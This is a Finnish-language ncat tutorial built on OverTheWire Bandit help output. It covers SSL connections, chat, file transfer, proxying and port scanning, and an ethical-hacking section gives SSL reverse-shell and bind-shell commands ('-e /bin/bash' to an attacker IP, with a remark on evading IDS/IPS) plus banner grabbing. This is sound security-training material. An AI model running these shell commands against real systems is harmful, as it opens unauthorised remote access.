# ncat - netcat

Ncat (netcat) on monipuolinen ja nykyaikainen komentorivityökalu verkkodatansiirtoon, jota käytetään tiedon lukemiseen, kirjoittamiseen ja uudelleenohjaamiseen verkoissa (TCP/UDP/SCTP/SSL). Nmap-projektin kehittämä työkalu toimii sekä asiakkaana että palvelimena, ja se on tehokas apuväline verkon diagnosointiin, porttiskannaukseen, tiedostonsiirtoon ja etähallintaan (remote shell). Sillä onkin kätevä testata vaikkapa palomuurin tai pakettisuodattimen toimintaa.


```
bandit15@bandit:~$ ncat --help
Ncat 7.94SVN ( https://nmap.org/ncat )
Usage: ncat [options] [hostname] [port]

Options taking a time assume seconds. Append 'ms' for milliseconds,
's' for seconds, 'm' for minutes, or 'h' for hours (e.g. 500ms).
  -4                         Use IPv4 only
  -6                         Use IPv6 only
  -U, --unixsock             Use Unix domain sockets only
      --vsock                Use vsock sockets only
  -C, --crlf                 Use CRLF for EOL sequence
  -c, --sh-exec <command>    Executes the given command via /bin/sh
  -e, --exec <command>       Executes the given command
      --lua-exec <filename>  Executes the given Lua script
  -g hop1[,hop2,...]         Loose source routing hop points (8 max)
  -G <n>                     Loose source routing hop pointer (4, 8, 12, ...)
  -m, --max-conns <n>        Maximum <n> simultaneous connections
  -h, --help                 Display this help screen
  -d, --delay <time>         Wait between read/writes
  -o, --output <filename>    Dump session data to a file
  -x, --hex-dump <filename>  Dump session data as hex to a file
  -i, --idle-timeout <time>  Idle read/write timeout
  -p, --source-port port     Specify source port to use
  -s, --source addr          Specify source address to use (doesn't affect -l)
  -l, --listen               Bind and listen for incoming connections
  -k, --keep-open            Accept multiple connections in listen mode
  -n, --nodns                Do not resolve hostnames via DNS
  -t, --telnet               Answer Telnet negotiations
  -u, --udp                  Use UDP instead of default TCP
      --sctp                 Use SCTP instead of default TCP
  -v, --verbose              Set verbosity level (can be used several times)
  -w, --wait <time>          Connect timeout
  -z                         Zero-I/O mode, report connection status only
      --append-output        Append rather than clobber specified output files
      --send-only            Only send data, ignoring received; quit on EOF
      --recv-only            Only receive data, never send anything
      --no-shutdown          Continue half-duplex when receiving EOF on stdin
      --allow                Allow only given hosts to connect to Ncat
      --allowfile            A file of hosts allowed to connect to Ncat
      --deny                 Deny given hosts from connecting to Ncat
      --denyfile             A file of hosts denied from connecting to Ncat
      --broker               Enable Ncat's connection brokering mode
      --chat                 Start a simple Ncat chat server
      --proxy <addr[:port]>  Specify address of host to proxy through
      --proxy-type <type>    Specify proxy type ("http", "socks4", "socks5")
      --proxy-auth <auth>    Authenticate with HTTP or SOCKS proxy server
      --proxy-dns <type>     Specify where to resolve proxy destination
      --ssl                  Connect or listen with SSL
      --ssl-cert             Specify SSL certificate file (PEM) for listening
      --ssl-key              Specify SSL private key (PEM) for listening
      --ssl-verify           Verify trust and domain name of certificates
      --ssl-trustfile        PEM file containing trusted SSL certificates
      --ssl-ciphers          Cipherlist containing SSL ciphers to use
      --ssl-servername       Request distinct server name (SNI)
      --ssl-alpn             ALPN protocol list to use
      --version              Display Ncat's version information and exit

See the ncat(1) manpage for full options, descriptions and usage examples
```

Muutamia esimerkkiä komentoja ja syntaksia asiakasohjelma (client) ja malli:
```
ncat [OPTIONS] <kohde/IP> <portti>
$ ncat --ssl 192.168.1.1 443
```

Ennen sitä putki edessä  `|` - tämä tarkoittaa lähettää esim. tekstin "abcd" suojatun SSL-yhteyden yli paikallisen koneen porttiin 30001. Tämä on hyvin yleinen tapa testata, ottaako palvelin dataa vastaan.

```
$echo "abcd" | ncat --ssl localhost 30001
```

## Muita hyödyllisiä komentoja ja käyttötapauksia

1. PERUSSYNTAKSI (CLIENT) <br>
Komento: `$ncat [valitsimet] <kohde/IP> <portti>` <br>
Esimerkki: `$ncat --ssl 192.168.1.1 443` <br>
Käyttö: Muodostaa suojatun yhteyden palvelimeen. <br>
<br>

2. SSL-SALATTU CHAT-PALVELIN <br>
Palvelin: `$ncat -l --ssl --chat 4444` <br>
Asiakas: `$ncat --ssl <palvelimen_ip> 4444` <br>
Käyttö: Luo täysin salatun pikaviestiyhteyden kahden koneen välille. --chat lisää viesteihin käyttäjä-ID:t. <br>
<br>

3. SUOJATTU TIEDOSTONSIIRTO <br>
Vastaanottaja: `$ncat -l --ssl 5555 > vastaanotettu_tiedosto.zip` <br>
Lähettäjä: `$ncat --ssl <vastaanottajan_ip> 5555 < tiedosto_lähetettävä.zip` <br>
Käyttö: Turvallinen tapa siirtää tiedostoja ilman erillisiä palvelinohjelmistoja. <br>
<br>

4. HTTP-VÄLITYSPALVELIN (PROXY) <br>
Komento: `$ncat -l 3128 --proxy-type http` <br>
Käyttö: Luo paikallisen HTTP-proxyn, jonka kautta voit reitittää muuta verkkoliikennettä. <br>
<br>

5. PORTTIEN JA YHTEYDEN TARKISTUS (SCANNING) <br>
Komento: `$ncat -zv <kohde_ip> 20-100` <br>
Käyttö: Tarkistaa nopeasti, mitkä portit välillä 20-100 ovat auki. <br>
-z: Zero-I/O (yhteys ilman dataa) <br>
-v: Verbose (yksityiskohtainen palaute) <br>
<br>

6. SSL-SERTIFIKAATIN VARMENTAMINEN <br> 
Komento: `$ncat --ssl-verify <kohde> 443` <br>
Käyttö: Varmistaa, että kohteen SSL-sertifikaatti on luotettu ja voimassa. Estää yhteyden, jos sertifikaatti on epäilyttävä. <br>
<br>

LISÄVALITSIMET (ADVANCED)

- -k (Keep-open): Pitää palvelimen päällä, vaikka asiakas poistuu.
- -i (Idle-timeout): Katkaisee yhteyden automaattisesti toimettomuuden jälkeen (esim. 30s).
- -x (Hex-dump): Tallentaa kaiken liikenteen heksamuodossa analysointia varten.
- -n (No-DNS): Estää DNS-haut, nopeuttaa ja pysyy hiljaisempana.
- -C (CRLF): Käyttää verkkoprotokollien vaatimaa rivinvaihtoa.
- -u (UDP): Käyttää UDP-protokollaa TCP:n sijaan.

## NCAT - TIETOTURVA JA EETINEN HAKKEROINTI

Ncat on eettisessä hakkeroinnissa ja tietoturvatestauksessa yksi tärkeimmistä työkaluista juuri sen takia, että se on usein esiasennettuna tai helposti saatavilla (osana Nmapia).

1. REVERSE SHELL (SSL-SUOJATTU) <br>
Tämä on klassinen tapa saada yhteys kohteesta hyökkääjän koneelle. SSL estää palomuureja (IDS/IPS) näkemästä komentoja selväkielisenä. <br>
Hyökkääjän kuuntelija: `$ncat -l --ssl -p 4444` <br>
Uhri (kohde): `$ncat --ssl <hyökkääjän_ip> 4444 -e /bin/bash` <br>
(Windowsissa: -e cmd.exe) <br>
Käyttö: Kohde yhdistää takaisin hyökkääjään ja antaa pääsyn komentoriville. <br>
<br>

2. BIND SHELL (SSL-SUOJATTU) <br>
Tässä kohde avaa portin ja jää odottamaan, että hyökkääjä yhdistää siihen. <br>
Uhri (kohde): `$ncat -l --ssl -p 4444 -e /bin/bash` <br>
Hyökkääjä: `$ncat --ssl <uhrin_ip> 4444` <br>
Käyttö: Käytetään, jos kohteessa ei ole palomuuria estämässä sisäänpäin tulevaa liikennettä. <br>
<br>

3. BANNER GRABBING (TIEDONKERUU) <br>
Ncatilla voidaan selvittää, mikä palvelu ja versio portissa pyörii. <br>
Komento: `$echo "" | ncat -v -n -w 1 <kohde_ip> <portti>` <br>
Käyttö: Palvelin vastaa usein kertomalla nimensä ja versionsa (esim. "Apache/2.4.41"), mikä auttaa haavoittuvuuksien etsinnässä. <br>
<br>

4. PÄÄSYLISTAT (ACCESS CONTROL) <br>
Voit rajoittaa, kuka saa yhdistää kuuntelevaan Ncatiin. <br>
Komento: `$ncat -l --ssl -p 8080 --allow 192.168.1.10` <br>
Käyttö: Sallii yhteydet vain tietystä IP-osoitteesta. --deny kieltää tietyn osoitteen. Hyödyllinen oman hyökkäysinfrastruktuurin suojaamiseen. <br><br>

5. PORTTIEN UUDELLEENOHJAUS (PORT RELAY) <br>
Ncat toimii siltana kahden eri verkon tai koneen välillä. <br>
Komento: `$ncat -l 8080 -c "ncat <kohde_ip> 80"` <br>
Käyttö: Kun joku yhdistää koneesi porttiin 8080, Ncat ohjaa liikenteen automaattisesti eteenpäin kohde-IP:n porttiin 80. <br><br>

6. HTTP-VASTAUKSEN SIMULOINTI <br>
Voit testata, miten sovellus käyttäytyy, kun se saa tietyn vastauksen palvelimelta. <br>
Komento: `$ncat -l 80 < vastaus_tiedosto.txt` <br>
Käyttö: Kun selain tai työkalu yhdistää porttiin 80, Ncat syöttää sille tiedoston sisällön (esim. muokatun HTTP-headerin). <br>


